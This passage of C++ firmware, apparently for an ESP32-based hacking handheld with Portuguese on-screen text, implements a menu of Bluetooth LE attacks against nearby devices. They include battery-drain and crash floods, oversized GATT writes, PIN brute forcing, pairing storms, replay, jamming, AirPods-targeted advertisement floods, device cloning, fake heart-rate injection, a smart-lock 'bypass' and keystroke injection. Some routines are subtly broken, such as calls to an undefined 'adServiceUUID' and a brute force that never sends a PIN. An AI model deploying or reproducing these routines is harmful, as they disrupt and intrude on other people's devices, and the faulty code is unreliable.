        bleShowStats(floodCount, millis() - startTime, 0);
        delay(10);
    }
    BLEDevice::deinit();
}

void bleParamAbuseDrain() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyDrain");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("PARAM ABUSE DRAIN", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t drainCount = 0;
    uint32_t startTime = millis();

    while (!check(EscPress)) {
        // Request aggressive connection parameters
        client->setConnectionParams(6, 6, 0, 100); // 7.5ms interval, no latency, short timeout
        drainCount++;
        bleShowStats(drainCount, millis() - startTime, client->getRssi());
        delay(100);
    }

    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleFirmwareCrash() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyCrash");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("FIRMWARE CRASH", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t crashCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("1800");
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                // Send oversized/malformed reads
                for (int i = 0; i < 5; i++) {
                    uint8_t bigData[512];
                    memset(bigData, 0xFF, sizeof(bigData));
                    ch->writeValue(bigData, sizeof(bigData), false);
                    crashCount++;
                }
            }
        }
        bleShowStats(crashCount, millis(), client->getRssi());
        delay(50);
    }

    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleCharOverflow() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyOverflow");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("CHAR OVERFLOW", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t overflowCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("1800");
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) {
                    // Send maximum size data
                    std::vector<uint8_t> overflowData(512, 0xAA);
                    ch->writeValue(overflowData.data(), overflowData.size(), false);
                    overflowCount++;
                }
            }
        }
        bleShowStats(overflowCount, millis(), client->getRssi());
        delay(100);
    }

    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void blePINBruteForce() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("PIN BRUTE FORCE", tftWidth / 2, 28, SMOOTH_FONT);

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyPIN");

    uint32_t attempts = 0;
    uint32_t startTime = millis();
    int maxPIN = 9999;

    for (int pin = 0; pin <= maxPIN && !check(EscPress); pin++) {
        NimBLEClient* client = BLEDevice::createClient();
        client->setSecurityAuth(true, true, true);
        client->setConnectTimeout(500);

        if (client->connect(addr)) {
            tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
            tft.drawCentreString("PIN ENCONTRADO: " + String(pin), tftWidth / 2, tftHeight / 2, 1);
            _tone(3000, 300);
            delay(3000);
            client->disconnect();
            delete client;
            break;
        }

        attempts++;
        delete client;

        // Display progress
        if (attempts % 100 == 0) {
            tft.fillRect(10, 50, tftWidth - 20, 60, wilyConfig.bgColor);
            tft.setTextSize(FM);
            tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
            tft.drawCentreString("PIN: " + String(pin) + "/" + String(maxPIN), tftWidth / 2, 60, 1);
            tft.setTextSize(FP);
            bleShowStats(attempts, millis() - startTime, 0);
        }
        delay(10);
    }
    BLEDevice::deinit();
}

void blePairingStorm() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyStorm");

    uint32_t stormCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("PAIRING STORM", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEClient* client = BLEDevice::createClient();
        client->setSecurityAuth(true, true, true);
        client->setConnectTimeout(200);
        client->connect(addr);
        delay(50);
        client->disconnect();
        delete client;
        stormCount++;

        bleShowStats(stormCount, millis() - startTime, 0);
        delay(5);
    }
    BLEDevice::deinit();
}

void bleReplayAttack() {
    displayTextLine("Replay: capturando...");
    auto results = blePerformScan(5);

    if (results.empty()) {
        displayError("Nenhum dado capturado");
        return;
    }

    // Store captured data
    std::vector<BLEPacketLog> captured;
    for (auto& r : results) {
        BLEPacketLog pkt;
        pkt.timestamp = r.timestamp;
        pkt.rssi = r.rssi;
        pkt.sourceAddr = r.address;
        pkt.data.assign(r.manufacturerData.begin(), r.manufacturerData.end());
        captured.push_back(pkt);
    }

    tft.setTextColor(TFT_YELLOW, wilyConfig.bgColor);
    tft.drawCentreString("Capturados: " + String(captured.size()) + " pacotes", tftWidth / 2, 60, 1);
    delay(1000);

    if (!bleConfirmAction("Replay os pacotes?")) return;

    BLEDevice::init("WilyReplay");
    uint32_t replayCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("REPLAY ATIVO", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        for (auto& pkt : captured) {
            NimBLEAdvertising* adv = BLEDevice::getAdvertising();
            NimBLEAdvertisementData adData;
            if (!pkt.data.empty()) {
                adData.setManufacturerData(std::string(pkt.data.begin(), pkt.data.end()));
            }
            adv->setAdvertisementData(adData);
            adv->start();
            delay(50);
            adv->stop();
            replayCount++;
        }
        bleShowStats(replayCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleMITMPair() {
    displayTextLine("MITM Pairing...");
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyMITM");
    NimBLEServer* server = BLEDevice::createServer();

    NimBLEService* svc = server->createService("1801");
    NimBLECharacteristic* ch = svc->createCharacteristic(
        "2A06", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
    );

    uint32_t pairCount = 0;
    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("MITM PAIRING", tftWidth / 2, 28, SMOOTH_FONT);

    BLEServerCallbacks cb;
    server->setCallbacks(&cb);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setConnectable(true);
        adv->start();
        pairCount++;

        tft.fillRect(10, 50, tftWidth - 20, 30, wilyConfig.bgColor);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawCentreString("Aguardando conexao... (" + String(pairCount) + ")", tftWidth / 2, 60, 1);
        delay(2000);
        adv->stop();
    }
    BLEDevice::deinit();
}

void bleJammerAll() {
    if (!bleConfirmAction("Iniciar BLE Jammer?")) return;

    BLEDevice::init("WilyJam");
    uint32_t jamCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("BLE JAMMER ATIVO", tftWidth / 2, 28, SMOOTH_FONT);
    tft.setTextColor(TFT_YELLOW, wilyConfig.bgColor);
    tft.drawCentreString("Canais 37, 38, 39", tftWidth / 2, 48, 1);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        // Flood all 3 advertising channels
        for (int ch = 0; ch < 3; ch++) {
            uint8_t jamData[31];
            for (int i = 0; i < 31; i++) jamData[i] = random(0, 255);
            NimBLEAdvertisementData adData;
            adData.setManufacturerData(std::string((char*)jamData, 31));
            adv->setAdvertisementData(adData);
            adv->start();
            delay(10);
            adv->stop();
            jamCount++;
        }
        bleShowStats(jamCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleGATTConfusion() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyGATT");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("GATT CONFUSION", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t confuseCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("1800");
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                // Read then write random data
                if (ch->canRead()) ch->readValue();
                if (ch->canWrite()) {
                    uint8_t randData[20];
                    for (int i = 0; i < 20; i++) randData[i] = random(0, 255);
                    ch->writeValue(randData, 20, false);
                }
                confuseCount++;
            }
        }
        bleShowStats(confuseCount, millis(), client->getRssi());
        delay(100);
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleL2CAPFlood() {
    if (!bleConfirmAction("Iniciar L2CAP Flood?")) return;

    BLEDevice::init("WilyL2CAP");
    uint32_t floodCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("L2CAP FLOOD", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        NimBLEAdvertisementData adData;
        adServiceUUID(NimBLEUUID("1800"));
        adServiceUUID(NimBLEUUID("1801"));
        adServiceUUID(NimBLEUUID("180A"));
        adv->setAdvertisementData(adData);
        adv->start();
        delay(20);
        adv->stop();
        floodCount++;
        bleShowStats(floodCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleCrossProtocol() {
    displayTextLine("Cross-Protocol BLE...");
    BLEDevice::init("WilyCross");
    NimBLEServer* server = BLEDevice::createServer();

    // Create services that mimic other protocols
    NimBLEService* svc1 = server->createService("1800");
    NimBLEService* svc2 = server->createService("1801");

    uint32_t crossCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("CROSS-PROTOCOL", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        NimBLEAdvertisementData adData;
        // Mix service UUIDs to confuse scanners
        adServiceUUID(NimBLEUUID("1800"));
        adServiceUUID(NimBLEUUID("FEAA")); // Eddystone
        adServiceUUID(NimBLEUUID("FFF6")); // Apple
        adServiceUUID(NimBLEUUID("184F")); // Audio
        adv->setAdvertisementData(adData);
        adv->start();
        delay(100);
        adv->stop();
        crossCount++;
        bleShowStats(crossCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

//================================================================================
// 3. UTILITIES & TOOLS
//================================================================================

void blePacketCrafter() {
    displayTextLine("Packet Crafter");

    String name = keyboard("WilyCraft", 20, "Nome BLE:");
    if (name == "\x1B") return;

    BLEDevice::init(name.c_str());
    NimBLEServer* server = BLEDevice::createServer();
    NimBLEService* svc = server->createService("1800");
    NimBLECharacteristic* ch = svc->createCharacteristic(
        "2A00", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY
    );
    ch->setValue(name.c_str());

    uint32_t txCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("PACKET CRAFTER", tftWidth / 2, 28, SMOOTH_FONT);
    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.drawCentreString("Broadcasting: " + name, tftWidth / 2, 50, 1);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setConnectable(true);
        adv->start();
        delay(1000);
        adv->stop();
        txCount++;
        bleShowStats(txCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleRawAdvertising() {
    String hexData = keyboard("020106", 60, "Dados hex (adv data):");
    if (hexData == "\x1B") return;

    // Parse hex string
    std::vector<uint8_t> rawData;
    for (size_t i = 0; i + 1 < hexData.length(); i += 2) {
        uint8_t byte = (uint8_t)strtol(hexData.substring(i, i + 2).c_str(), nullptr, 16);
        rawData.push_back(byte);
    }

    BLEDevice::init("WilyRaw");
    NimBLEAdvertising* adv = BLEDevice::getAdvertising();

    NimBLEAdvertisementData adData;
    adData.setManufacturerData(std::string(rawData.begin(), rawData.end()));

    uint32_t sendCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("RAW ADVERTISING", tftWidth / 2, 28, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
    tft.drawString("Payload: " + hexData.substring(0, 40), 10, 60);

    while (!check(EscPress)) {
        adv->setAdvertisementData(adData);
        adv->start();
        delay(100);
        adv->stop();
        sendCount++;
        bleShowStats(sendCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleManufacturerDecoder() {
    displayTextLine("Decoder Mfg Data");
    auto results = blePerformScan(5);

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("Manufacturer Data", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    for (auto& r : results) {
        if (!r.manufacturerData.empty()) {
            tft.setTextSize(FP);
            tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
            tft.drawString(r.name + ": ", 10, y);
            String hex = "";
            for (uint8_t b : r.manufacturerData) {
                if (b < 0x10) hex += "0";
                hex += String(b, HEX);
            }
            tft.setTextColor(TFT_CYAN, wilyConfig.bgColor);
            tft.drawString(hex, 10, y + 14);
            y += 32;
            if (y > tftHeight - 40) break;
        }
    }
    bleCleanup();
    delay(5000);
}

void bleSignalMonitor() {
    displayTextLine("Monitor de Sinal...");
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    std::vector<BLESignalSample> samples;
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("SIGNAL MONITOR", tftWidth / 2, 28, SMOOTH_FONT);
    tft.drawCentreString(target, tftWidth / 2, 48, 1);

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilySignal");

    while (!check(EscPress)) {
        NimBLEClient* client = BLEDevice::createClient();
        client->setConnectTimeout(1000);

        BLESignalSample sample;
        sample.timestamp = millis();

        if (client->connect(addr)) {
            sample.rssi = client->getRssi();
            client->disconnect();
        } else {
            sample.rssi = -100;
        }
        delete client;

        samples.push_back(sample);
        if (samples.size() > 100) samples.erase(samples.begin());

        // Draw graph
        tft.fillRect(10, 65, tftWidth - 20, tftHeight - 100, wilyConfig.bgColor);
        int graphH = tftHeight - 110;
        int graphW = tftWidth - 20;
        tft.drawRect(10, 65, graphW, graphH, TFT_WHITE);

        if (samples.size() > 1) {
            for (size_t i = 1; i < samples.size(); i++) {
                int x1 = 10 + (i - 1) * graphW / samples.size();
                int y1 = 65 + graphH - map(samples[i-1].rssi, -100, 0, 0, graphH);
                int x2 = 10 + i * graphW / samples.size();
                int y2 = 65 + graphH - map(samples[i].rssi, -100, 0, 0, graphH);
                tft.drawLine(x1, y1, x2, y2, wilyConfig.priColor);
            }
        }

        tft.setTextSize(FP);
        tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
        tft.drawString("RSSI: " + String(samples.back().rssi) + " dBm", 10, tftHeight - 30);

        delay(500);
    }
    BLEDevice::deinit();
}

void bleMACRandomizer() {
    displayTextLine("MAC Randomizer");
    uint8_t newMAC[6];
    for (int i = 0; i < 6; i++) newMAC[i] = random(0, 255);
    // Set locally administered bit, clear multicast bit
    newMAC[0] = (newMAC[0] & 0xFE) | 0x02;

    String macStr = "";
    for (int i = 0; i < 6; i++) {
        if (i > 0) macStr += ":";
        if (newMAC[i] < 0x10) macStr += "0";
        macStr += String(newMAC[i], HEX);
    }
    macStr.toUpperCase();

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("MAC RANDOMIZER", tftWidth / 2, 28, SMOOTH_FONT);
    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.setTextSize(FM);
    tft.drawCentreString(macStr, tftWidth / 2, tftHeight / 2, 1);
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
    tft.drawCentreString("Novo MAC gerado", tftWidth / 2, tftHeight / 2 + 30, 1);

    delay(3000);
}

void bleBadgeCreator() {
    String badgeName = keyboard("WILLY", 20, "Nome do Badge:");
    if (badgeName == "\x1B") return;

    BLEDevice::init(badgeName.c_str());
    NimBLEServer* server = BLEDevice::createServer();
    NimBLEService* svc = server->createService("1800");
    NimBLECharacteristic* ch = svc->createCharacteristic(
        "2A00", NIMBLE_PROPERTY::READ
    );
    ch->setValue(badgeName.c_str());

    uint32_t advCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("BLE BADGE", tftWidth / 2, 28, SMOOTH_FONT);
    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.setTextSize(FM);
    tft.drawCentreString(badgeName, tftWidth / 2, tftHeight / 2, 1);
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
    tft.drawCentreString("Visivel para outros dispositivos", tftWidth / 2, tftHeight / 2 + 30, 1);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setConnectable(true);
        adv->start();
        delay(2000);
        adv->stop();
        advCount++;
        bleShowStats(advCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleDeviceClone() {
    displayTextLine("Clonando dispositivo...");
    auto results = blePerformScan(5);
    if (results.empty()) {
        displayError("Nenhum dispositivo encontrado");
        return;
    }

    // Select device to clone
    options.clear();
    int selected = -1;
    for (size_t i = 0; i < results.size(); i++) {
        String label = results[i].name + " (" + results[i].address + ")";
        int idx = i;
        options.push_back({label, [&, idx]() { selected = idx; }});
    }
    addOptionToMainMenu();
    loopOptions(options);

    if (selected < 0) return;
    BLEScanResult& src = results[selected];

    String cloneName = keyboard(src.name, 20, "Nome do clone:");
    if (cloneName == "\x1B") cloneName = src.name;

    BLEDevice::init(cloneName.c_str());
    NimBLEServer* server = BLEDevice::createServer();
    NimBLEService* svc = server->createService("1800");
    NimBLECharacteristic* ch = svc->createCharacteristic(
        "2A00", NIMBLE_PROPERTY::READ
    );
    ch->setValue(cloneName.c_str());

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("DEVICE CLONE", tftWidth / 2, 28, SMOOTH_FONT);
    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.drawCentreString("Clonando: " + src.name, tftWidth / 2, 60, 1);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setConnectable(true);
        adv->start();
        delay(1000);
        adv->stop();
    }
    BLEDevice::deinit();
}

void bleDistanceEstimator() {
    displayTextLine("Estimador de distancia...");
    auto results = blePerformScan(5);
    if (results.empty()) {
        displayError("Nenhum dispositivo encontrado");
        return;
    }

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("DISTANCE ESTIMATOR", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    for (auto& r : results) {
        // RSSI to distance estimation (simplified log-distance model)
        float distance = pow(10, (-69 - r.rssi) / (10.0 * 2.5));
        String distStr;
        if (distance < 1.0) distStr = String((int)(distance * 100)) + " cm";
        else distStr = String(distance, 1) + " m";

        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawString(r.name, 10, y);
        tft.setTextColor(TFT_CYAN, wilyConfig.bgColor);
        tft.drawString(distStr + " (" + String(r.rssi) + "dBm)", 10, y + 14);
        y += 32;
        if (y > tftHeight - 40) break;
    }
    bleCleanup();
    delay(5000);
}

void blePacketLogger() {
    if (!setupSdCard()) {
        displayError("SD Card nao encontrado");
        return;
    }

    String filename = "/ble_log_" + String(millis()) + ".csv";
    File logFile = SD.open(filename, FILE_WRITE);
    if (!logFile) {
        displayError("Erro ao criar log");
        return;
    }

    logFile.println("Timestamp,RSSI,Name,Address,ManufacturerData");
    displayTextLine("Logando pacotes...");

    uint32_t logCount = 0;
    uint32_t startTime = millis();

    while (!check(EscPress)) {
        auto results = blePerformScan(2, false);
        for (auto& r : results) {
            String mfgHex = "";
            for (uint8_t b : r.manufacturerData) {
                if (b < 0x10) mfgHex += "0";
                mfgHex += String(b, HEX);
            }
            logFile.printf("%lu,%d,%s,%s,%s\n",
                millis(), r.rssi, r.name.c_str(), r.address.c_str(), mfgHex.c_str());
            logCount++;
        }

        tft.fillRect(10, 50, tftWidth - 20, 30, wilyConfig.bgColor);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
        tft.drawCentreString("Log: " + String(logCount) + " pacotes", tftWidth / 2, 60, 1);
    }

    logFile.close();
    bleCleanup();
    tft.drawCentreString("Salvo: " + filename, tftWidth / 2, tftHeight - 20, 1);
    delay(2000);
}

void bleFirmwareDetector() {
    displayTextLine("Detectando firmwares...");
    auto results = blePerformScan(8);

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("FIRMWARE DETECTOR", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    for (auto& r : results) {
        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        String fw = "Desconhecido";
        if (r.name.indexOf("Wily") >= 0 || r.name.indexOf("Bruce") >= 0) fw = "Wily/Bruce FW";
        else if (r.name.indexOf("Flipper") >= 0) fw = "Flipper Zero";
        else if (r.name.indexOf("Pwnagotchi") >= 0) fw = "Pwnagotchi";
        else if (r.name.indexOf("AirPods") >= 0 || r.name.indexOf("AirPod") >= 0) fw = "Apple AirPods";
        else if (r.name.indexOf("Galaxy") >= 0) fw = "Samsung Galaxy";
        else if (r.name.indexOf("Pixel") >= 0) fw = "Google Pixel";
        else if (r.name.indexOf("ESP32") >= 0) fw = "ESP32 Generic";
        else if (r.appearance == 960) fw = "Keyboard";
        else if (r.appearance == 962) fw = "Mouse";
        else if (r.appearance == 240) fw = "Headphones";
        else if (r.appearance == 236) fw = "Speaker";

        tft.drawString(r.name + ": " + fw, 10, y);
        y += 18;
        if (y > tftHeight - 40) break;
    }
    bleCleanup();
    delay(5000);
}

//================================================================================
// 4. DEVICE-SPECIFIC EXPLOITS
//================================================================================

void bleAirPodsDrain() {
    if (!bleConfirmAction("Drenar AirPods?")) return;

    BLEDevice::init("WilyAirPods");
    uint32_t drainCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("AIRPODS BATTERY DRAIN", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        NimBLEAdvertisementData adData;
        // Apple FindMy advertisement format
        uint8_t appleData[] = {0x4C, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00};
        adData.setManufacturerData(std::string((char*)appleData, sizeof(appleData)));
        adv->setAdvertisementData(adData);
        adv->start();
        delay(20);
        adv->stop();
        drainCount++;
        bleShowStats(drainCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleAirPodsCrash() {
    if (!bleConfirmAction("Crash AirPods?")) return;

    BLEDevice::init("WilyCrashAP");
    NimBLEServer* server = BLEDevice::createServer();

    // Create malformed service that confuses AirPods
    NimBLEService* svc = server->createService("FE2C");
    for (int i = 0; i < 10; i++) {
        svc->createCharacteristic(
            NimBLEUUID(0xFE2C + i),
            NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE
        );
    }

    uint32_t crashCount = 0;
    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("AIRPODS CRASH", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->start();
        delay(100);
        adv->stop();
        crashCount++;
        bleShowStats(crashCount, millis(), 0);
    }
    BLEDevice::deinit();
}

void bleTileManipulate() {
    displayTextLine("Tile Tracker...");
    BLEDevice::init("WilyTile");
    NimBLEServer* server = BLEDevice::createServer();

    NimBLEService* svc = server->createService("FEED");
    NimBLECharacteristic* ch = svc->createCharacteristic(
        "2A00", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY
    );
    ch->setValue("Tile-Fake");

    uint32_t manipCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("TILE MANIPULATE", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        NimBLEAdvertisementData adData;
        adServiceUUID(NimBLEUUID("FEED"));
        uint8_t tileData[] = {0x12, 0x16, 0xED, 0xFE, 0x01, 0x00, 0x00, 0x00};
        adData.setManufacturerData(std::string((char*)tileData, sizeof(tileData)));
        adv->setAdvertisementData(adData);
        adv->start();
        delay(500);
        adv->stop();
        manipCount++;
        bleShowStats(manipCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleFitbitInject() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyFitbit");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("FITBIT INJECT", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t injectCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("180D"); // Heart Rate
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) {
                    uint8_t fakeHR[] = {0x00, 0x4B}; // HR=75
                    ch->writeValue(fakeHR, 2, false);
                    injectCount++;
                }
            }
        }
        bleShowStats(injectCount, millis(), client->getRssi());
        delay(500);
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleSmartLockBypass() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyLock");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("SMART LOCK BYPASS", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t bypassCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("1801");
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) {
                    // Try common unlock codes
                    uint8_t unlockCmd[] = {0x01, 0x00};
                    ch->writeValue(unlockCmd, 2, false);
                    bypassCount++;
                }
            }
        }
        bleShowStats(bypassCount, millis(), client->getRssi());
        delay(100);
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleKeyboardInject() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyKbInject");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("KEYBOARD INJECT", tftWidth / 2, 28, SMOOTH_FONT);

    // HID Keystroke injection
    NimBLERemoteService* hidSvc = client->getService("1812");
    if (hidSvc) {
        auto chars = hidSvc->getCharacteristics(true);
        for (auto* ch : chars) {
            if (ch->canWrite()) {
                // Send "WILLY" as keystrokes
                uint8_t keys[] = {
                    0x00, 0x00, 0x1A, 0x00, 0x00, 0x00, 0x00, 0x00, // W
                    0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, // I
                    0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, // L
